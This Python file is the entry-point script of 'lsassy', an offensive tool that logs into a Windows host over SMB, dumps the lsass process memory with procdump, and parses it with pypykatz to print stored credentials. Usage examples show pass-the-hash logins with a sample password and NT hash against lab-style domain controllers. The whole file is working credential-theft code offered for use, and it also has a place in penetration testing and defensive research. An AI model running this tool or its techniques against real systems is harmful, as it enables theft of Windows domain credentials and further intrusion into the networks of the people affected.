#!/usr/bin/env python3
#
# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

import pkg_resources
import sys
from pypykatz.pypykatz import pypykatz
from lsassy.impacketconnection import ImpacketConnection
from lsassy.impacketfile import ImpacketFile
from lsassy.parser import Parser
from lsassy.dumper import Dumper

version = pkg_resources.require("lsassy")[0].version


def run():
    import argparse

    examples = '''examples:
  lsassy ADSEC.LOCAL/pixis:p4ssw0rd@dc01.adsec.local:/C$/Windows/Temp/lsass.dmp
  lsassy localuser@desktop01.adsec.local:/C$/Windows/Temp/lsass.dmp
  lsassy -j ADSEC.LOCAL/pixis:p4ssw0rd@dc01.adsec.local:/C$/Windows/Temp/lsass.dmp
  lsassy -g ADSEC.LOCAL/pixis:p4ssw0rd@dc01.adsec.local:/C$/Windows/Temp/lsass.dmp
  lsassy --hashes 952c28bd2fd728898411b301475009b7 pixis@dc01.adsec.local:/ADMIN$/lsass.dmp'''

    parser = argparse.ArgumentParser(
        prog="lsassy",
        description='lsassy v{} - Remote lsass dump reader'.format(version),
        epilog=examples,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    group_auth = parser.add_argument_group('procdump')
    group_auth.add_argument('-p', '--path', action='store', help='lsass dump path')
    group_auth.add_argument('-P', '--procdump', action='store', help='procdump base base (Default: /tmp/)')
    group_auth = parser.add_argument_group('authentication')
    group_auth.add_argument('--hashes', action='store', help='[LM:]NT hash')
    group_out = parser.add_argument_group('output')
    group_out.add_argument('-j', '--json', action='store_true',help='Print credentials in JSON format')
    group_out.add_argument('-g', '--grep', action='store_true', help='Print credentials in greppable format')
    parser.add_argument('-r', '--raw', action='store_true', help='Raw results without filtering')
    parser.add_argument('-d', '--debug', action='store_true', help='Debug output')
    parser.add_argument('-V', '--version', action='version', version='%(prog)s (version {})'.format(version))
    parser.add_argument('target', action='store', help='[domain/]username[:password]@<host>')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()
    conn = ImpacketConnection.from_args(args, args.debug)
    file_path = args.path
    if not args.path:
        dumper = Dumper(conn, args, args.debug)
        file_path = dumper.dump()

    ifile = ImpacketFile()
    ifile.open(conn, file_path)
    dumpfile = pypykatz.parse_minidump_external(ifile)
    parser = Parser(dumpfile)
    parser.output(args)
    

if __name__ == '__main__':
    run()
